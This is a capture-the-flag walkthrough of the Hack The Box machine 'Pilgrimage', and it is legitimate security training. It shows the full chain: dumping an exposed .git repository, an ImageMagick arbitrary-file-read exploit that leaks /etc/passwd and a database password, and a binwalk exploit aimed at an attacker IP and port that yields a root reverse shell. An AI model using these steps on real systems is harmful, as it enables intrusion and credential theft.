---
machine: Pilgrimage
platform: Hack The Box
category: Linux
difficulty: Easy
points: 20
tags: [exposed-git, imagemagick, cve-2022-44268, binwalk, cve-2022-4510]
date: 2026-04-20
status: retired
summary: "A Linux web box centered on an image-shrinking service: it tests source-code recovery from an exposed version-control directory, exploitation of an image-processing library, and abuse of a root-run file-analysis tool for privilege escalation."
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo nmap -sCV 10.129.1.104 -oN nmapscan                                                     
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 08:55 -0400
Nmap scan report for 10.129.1.104
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

So from our nmap scan we see we need to add pilgrimage.htb domain to our /etc/hosts to access the website and we also see that its most likely our foothold vector given that ssh is the only other service

The site has a file upload field, so I am wondering if it may be vulnerable to a php webshell

Upon rerunning my nmap scan we reach an interesting fingding:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo nmap -sCV 10.129.1.104 -oN nmapscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 08:57 -0400
Nmap scan report for pilgrimage.htb (10.129.1.104)
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.129.1.104:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have `.git` directory 
Its 403 forbidden though so we can use a tool like `gitdumper.sh` from GitTools

refer to [[Setting Up Tools]] for installation:

```bash
──(venv)─(kali㉿kali)-[~/htb/pilgrimage/GitTools/Dumper]
└─$ ./gitdumper.sh http://pilgrimage.htb/.git/ ../../

┌──(venv)─(kali㉿kali)-[~/htb/pilgrimage]
└─$ git checkout .
Updated 37 paths from the index
                                                                                
┌──(venv)─(kali㉿kali)-[~/htb/pilgrimage]
└─$ ls -la 
total 26980
drwxrwxr-x  7 kali kali     4096 May 21 09:31 .
drwxrwxr-x 23 kali kali     4096 May 21 09:13 ..
drwxrwxr-x  6 kali kali     4096 May 21 09:31 assets
-rwxrwxr-x  1 kali kali     5538 May 21 09:31 dashboard.php
drwxrwxr-x  6 kali kali     4096 May 21 09:31 .git
drwxrwxr-x  4 kali kali     4096 May 21 09:15 git-dumper
drwxrwxr-x  7 kali kali     4096 May 21 09:17 GitTools
-rwxrwxr-x  1 kali kali     9250 May 21 09:31 index.php
-rwxrwxr-x  1 kali kali     6822 May 21 09:31 login.php
-rwxrwxr-x  1 kali kali       98 May 21 09:31 logout.php
-rwxrwxr-x  1 kali kali 27555008 May 21 09:31 magick
-rwxrwxr-x  1 kali kali     6836 May 21 09:31 register.php
drwxrwxr-x  4 kali kali     4096 May 21 09:31 vendor

```

In the commit message we see the author is emily from `emily@pilgrimage.htb` and we see that we have a tool called magick added in the commit

Checking the version of this binary:

```bash
──(venv)─(kali㉿kali)-[~/htb/pilgrimage]
└─$ magick --version
Version: ImageMagick 7.1.2-18 Q16 x86_64 23822 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/license/
Features: Cipher DPC Modules OpenMP(4.5) 
Delegates (built-in): bzlib djvu fftw fontconfig freetype heic jbig jng jp2 jpeg lcms lqr ltdl lzma openexr pangocairo png raw tiff webp wmf x xml zlib zstd
Compiler: gcc (15.2)
```

We can see if there are any CVE's relating to it by searching magick in searchsploit:

```bash
┌──(venv)─(kali㉿kali)-[~/htb/pilgrimage]
└─$ searchsploit magick                                                                         
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Automagick Tube Script 1.4.4 - 'module' Cross-Site Scripting                                               | php/webapps/35645.txt
GeekLog 2.x - 'ImageImageMagick.php' Remote File Inclusion                                                 | php/webapps/3946.txt
GraphicsMagick - Memory Disclosure / Heap Overflow                                                         | multiple/dos/43111.py
ImageMagick - Memory Leak                                                                                  | multiple/local/45890.sh
ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH)                                                          | windows/local/31688.pl
ImageMagick 6.9.3-9 / 7.0.1-0 - 'ImageTragick' Delegate Arbitrary Command Execution (Metasploit)           | multiple/local/39791.rb
ImageMagick 6.x - '.PNM' Image Decoding Remote Buffer Overflow                                             | linux/dos/25527.txt
ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow                                            | linux/dos/28383.txt
ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities                                   | multiple/dos/39767.txt
ImageMagick 7.1.0-49 - Arbitrary File Read                                                                 | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                                                 | php/dos/51256.txt
Imagick 3.3.0 (PHP 5.4) - disable_functions Bypass                                                         | php/webapps/39766.php
Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authenticated)                    | php/webapps/51025.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
```

If we look into `ImageMagick 7.1.0-49 - Arbitrary File Read` we can find a PoC for `CVE-2022-44268` allowing us to https://git.rotfl.io/v/CVE-2022-44268

After cloning the git repo we can make the malicious read file:

```bash
# cargo run "etc/passwd" -> generates an image which will arbitrary read /etc/passwd

┌──(venv)─(kali㉿kali)-[~/htb/pilgrimage/CVE-2022-44268/CVE-2022-44268]
└─$ cargo run "/etc/passwd"
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.01s
     Running `target/debug/cve-2022-44268 /etc/passwd`
```

This generates an image.png we can upload to the website since we know the website uses the vulnerable magick binary to resize it:
`http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/6a0f11ad29d0e.png&status=success` <- upload successful

We can now download the resized image output from the website: `http://pilgrimage.htb/shrunk/6a0f11ad29d0e.png`

When we run exiftool to see the metadata we can see a chunk of encoded raw data which is presumably the output of out `/etc/passwd`

```bash
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ sudo exiftool 6a0f11ad29d0e.png
ExifTool Version Number         : 13.50
File Name                       : 6a0f11ad29d0e.png
Directory                       : .
File Size                       : 1080 bytes
File Modification Date/Time     : 2026:05:21 10:11:23-04:00
File Access Date/Time           : 2026:05:21 10:11:23-04:00
File Inode Change Date/Time     : 2026:05:21 10:11:23-04:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 100
Image Height                    : 100
Bit Depth                       : 1
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Palette                         : (Binary data 6 bytes, use -b option to extract)
Background Color                : 1
Modify Date                     : 2026:05:21 14:07:41
Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers) [x3]
Datecreate                      : 2026-05-21T14:07:41+00:00
Datemodify                      : 2026-05-21T14:07:41+00:00
Datetimestamp                   : 2026-05-21T14:07:41+00:00
Image Size                      : 100x100
Megapixels                      : 0.010
```

I save the raw data into a file called `decodeme` and then convert it from hex stripping out periods and new lines

```python
──(kali㉿kali)-[~/htb/pilgrimage]
└─$ python3 -c "
data = open('decodeme').read().replace('.','').replace('\n','').strip()
print(bytes.fromhex(data).decode())
"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We see that we will probably be targetting emily as she has a shell and would be the natural progression of this box

If we continue to read the source code we obtained from our `.git` clone, we find the location of the sqlite database in `index.php`: `$db = new PDO('sqlite:/var/db/pilgrimage');`

We can use our magick cve to read this too:

```bash
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ python3 -c "
data = open('decodeme2').read().replace('.','').replace('\n','').strip()
open('pilgrimage.db', 'wb').write(bytes.fromhex(data))
"

sqlite3 pilgrimage.db
.tables
SELECT * FROM users;
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from users;
emily|abigchonkyboi123
```

## Foothold

This gives us a password, we can try this on ssh to get a foothold
We do get a foothold on emily via ssh:

```bash
emily@pilgrimage:~$ ls
user.txt
emily@pilgrimage:~$ cat user.txt
```

## Privilege Escalation

Upon logging in, when we enumerate running processes which are running as root (`ps auxww | grep root`) we see an interesting script:
`root         638  0.0  0.0   6816  3008 ?        Ss   May21   0:00 /bin/bash /usr/sbin/malwarescan.sh`

When we cat this file we find:

```bash
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

I check for write perms to it or any binaries it calls:

```bash
emily@pilgrimage:~$ ls -lah /usr/sbin | grep malware
-rwxr--r--  1 root root    474 Jun  1  2023 malwarescan.sh
emily@pilgrimage:~$ ls -lah /usr/bin | grep inotify
-rwxr-xr-x  1 root root     31K May 26  2020 inotifywait
-rwxr-xr-x  1 root root     31K May 26  2020 inotifywatch
```

The script runs binwalk on all files that are uploaded and deletes them if the binwalk output contains "Executable Script" or "Microsoft Executable"

Lets investigate the binwalk binary:

```bash
emily@pilgrimage:~$ binwalk -h

Binwalk v2.3.2

emily@pilgrimage:~$ ls -lah /usr/local/bin | grep binwalk
-rwxr-xr-x  1 root root   60 Feb 16  2023 binwalk
```

This version matches what we see in searchsploit for binwalk:

```bash
──(kali㉿kali)-[~/htb/pilgrimage]
└─$ searchsploit binwalk                                                                        
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                                                                  | python/remote/51249.py
```

I can get this PoC from searchsploit and then run it for RCE

```bash
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ touch sus.png
                                                   
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ python3 binwalkexploit.py sus.png 10.10.15.144 1337

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
                                                   
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ ls
2.png              assets               binwalkexploit.py  dashboard.php  decodeme2   GitTools   login.php   magick         register.php  vendor
6a0f11ad29d0e.png  binwalk_exploit.png  CVE-2022-44268     decodeme       git-dumper  index.php  logout.php  pilgrimage.db  sus.png
```

Now we can host our listener, host our exploit file on a python server, cd into the `/var/www/pilgrimage.htb/shrunk/` directory and wget it down from our emily user.

This gives us a reverse shell on our listener as root:

```bash
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.20] from (UNKNOWN) [10.129.1.104] 51162
dir
_binwalk_exploit.png.extracted
whoami
root
```

From here we can grab the root.txt flag and complete the box
